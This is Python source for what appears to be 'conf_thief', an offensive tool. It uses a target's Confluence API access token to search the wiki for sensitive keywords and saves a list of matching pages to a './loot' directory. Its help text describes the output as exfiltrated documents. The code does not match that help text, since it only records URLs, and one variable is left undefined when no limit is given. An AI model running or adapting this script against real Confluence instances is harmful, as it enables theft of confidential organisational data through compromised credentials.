import requests, json, sys, getopt, time, os

# Set that holds all of the pages found in the keyword search
contentSet = set()

# Set these ENV Variables to proxy through burp:
# export REQUESTS_CA_BUNDLE='/path/to/pem/encoded/cert'
# export HTTP_PROXY="http://127.0.0.1:8080"
# export HTTPS_PROXY="http://127.0.0.1:8080"

form_token_headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Atlassian-Token": "no-check",
}

def getNumberOfPages(query, access_token, cURL, default_headers):
    totalSize = 0
    q = "/rest/api/search"
    URL = cURL + q
    response = requests.request("GET",
        URL,
        headers=default_headers,
        params=query
    )

    jsonResp = response.json()
    totalSize = int(jsonResp["totalSize"])
    return totalSize

def searchKeyWords(path, access_token, cURL, default_headers, limit):
    search_term = " "

    try:
        f = open(path, "r")
    except Exception as e:
        print('[*] An Error occured opening the dictionary file: %s' % str(e))
        sys.exit(2)

    print("[*] Searching for Confluence content for keywords and compiling a list of pages")
    for line in f:
        tempSetCount = len(contentSet)
        count = 0
        search_term = line.strip()
        searchQuery = {
            'cql': '{text~\"' + search_term + '\"}'
        }
        #searchQuery = f'cql=text~"{search_term}"&expand=body.storage'
        totalSize = getNumberOfPages(searchQuery, access_token, cURL, default_headers)
        if totalSize:
            print("[*] Setting {total} results for search term: {term}".format(total=totalSize, term=search_term))
            start_point = 1
            if totalSize > limit:
                totalSize = limit
            while start_point < totalSize:
                print("[*] Setting {startpoint} of {total} results for search term: {term}".format(startpoint=start_point, total=totalSize, term=search_term))
                q = "/rest/api/search?start={startpoint}&limit=250".format(startpoint=start_point)
                URL = cURL + q

                response = requests.request("GET",
                    URL,
                    headers=default_headers,
                    params=searchQuery
                )

                jsonResp = json.loads(response.text)
                for results in jsonResp['results']:
                    try:
                        pageId = ""
                        id_and_name = ""
                        contentId = results['content']['id']
                        pageId_url = results['content']['_links']['webui']
                        page_name = results['content']['title']
                        # Some results will have a pageId and some only a contentId.
                        # Need pageId if it exists, otherwise use contentId

                        id_and_name = pageId_url + "," + page_name
                        contentSet.add(id_and_name)
                    except Exception as e:
                        print("Error: " + str(e))
                start_point += 250

            if len(contentSet) > tempSetCount:
                count = len(contentSet) - tempSetCount
                tempSetCount = len(contentSet)
            print("[*] %i unique pages added to the set for search term: %s." % (count, search_term))
        else:
            print("[*] No documents found for search term: %s" % search_term)
    #print(contentSet)
    print("[*] Compiled set of %i unique pages to download from your search" % len(contentSet))


def saveContent(ogURL):
    print("[*] Saving content to file")
    save_path = './loot'
    file_name = "confluence_content.txt"
    completeName = os.path.join(save_path, file_name)
    f = open(completeName, "w")
    for page in contentSet:
        pageId = page.split(",")[0]
        pageName = page.split(",")[1]
        q = pageId
        URL = ogURL + q
        f.write(URL +"  -   "+ pageName + "\n")
    f.close()
    print("[*] Saved content to file")


def main():
    cURL=""
    dict_path = ""
    username = ""
    access_token = ""
    user_agent = ""

    # usage
    usage = '\nusage: python3 conf_thief.py [-h] -c <TARGET URL> -u <Target Username> -p <API ACCESS TOKEN> -d <DICTIONARY FILE PATH> [-a] "<UA STRING> [-l] <limit of results>"'

    #help
    help = '\nThis Module will connect to Confluence\'s API using an access token, '
    help += 'export to PDF, and download the Confluence documents\nthat the target has access to. '
    help += 'It allows you to use a dictionary/keyword search file to search all files in the target\nConfluence for'
    help += ' potentially sensitive data. It will output exfiltrated PDFs to the ./loot directory'
    help += '\n\narguments:'
    help += '\n\t-c <TARGET CONFLUENCE URL>, --url <TARGET CONFLUENCE URL>'
    help += '\n\t\tThe URL of target Confluence account'
    help += '\n\t-p <TARGET CONFLUENCE ACCOUNT API ACCESS TOKEN>, --accesstoken <TARGET CONFLUENCE ACCOUNT API ACCESS TOKEN>'
    help += '\n\t\tThe API Access Token of target Confluence account'
    help += '\n\t-d <DICTIONARY FILE PATH>, --dict <DICTIONARY FILE PATH>'
    help += '\n\t\tPath to the dictionary file.'
    help += '\n\t\tYou can use the provided dictionary, per example: "-d ./dictionaries/secrets-keywords.txt"'
    help += '\n\noptional arguments:'
    help += '\n\noptional arguments:'
    help += '\n\t-l <limit of results>, --limit <limit of results>'
    help += '\n\t\tNumber of Results to return'
    help += '\n\t\tYou can use an integer to limit the number of results returned: "-l 2000"'
    help += '\n\t-a "<DESIRED UA STRING>", --user-agent "<DESIRED UA STRING>"'
    help += '\n\t\tThe User-Agent string you wish to send in the http request.'
    help += '\n\t\tYou can use the latest chrome for MacOS for example: -a "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36"'
    help += '\n\t\tDefault is "python-requests/2.25.1"'
    help += '\n\n\t-h, --help\n\t\tshow this help message and exit\n'

    # try parsing options and arguments
    try :
        opts, args = getopt.getopt(sys.argv[1:], "hc:u:p:d:a:l:", ["help", "url=", "user=", "accesstoken=", "dict=", "user-agent="])
    except getopt.GetoptError as err:
        print(str(err))
        print(usage)
        sys.exit(2)
    for opt, arg in opts:
        if opt in ("-h", "--help"):
            print(help)
            sys.exit()
        if opt in ("-c", "--url"):
            cURL = arg
        if opt in ("-p", "--accesstoken"):
            access_token = arg
        if opt in ("-d", "--dict"):
            dict_path = arg
        if opt in ("-a", "--user-agent"):
            user_agent = arg
        if opt in ("-l", "--limit"):
            limit = int(arg)

    # check for mandatory arguments

    if not access_token:
        print("\nAccess Token  (-p, --accesstoken) is a mandatory argument\n")
        print(usage)
        sys.exit(2)

    if not dict_path:
        print("\nDictionary Path  (-d, --dict) is a mandatory argument\n")
        print(usage)
        sys.exit(2)
    if not cURL:
        print("\nConfluence URL  (-c, --url) is a mandatory argument\n")
        print(usage)
        sys.exit(2)

    # Strip trailing / from URL if it has one
    if cURL.endswith('/'):
        cURL = cURL[:-1]
    
    ogURL = cURL

    auth = str('Bearer ' + access_token)
    default_headers = {
    'Accept': 'application/json',
    'Authorization': auth
    }
    # Check for user-agent argument
    if user_agent:
        default_headers['User-Agent'] = user_agent
        form_token_headers['User-Agent'] = user_agent

    searchKeyWords(dict_path, access_token, cURL, default_headers, limit)
    saveContent(ogURL)

if __name__ == "__main__":
    main()
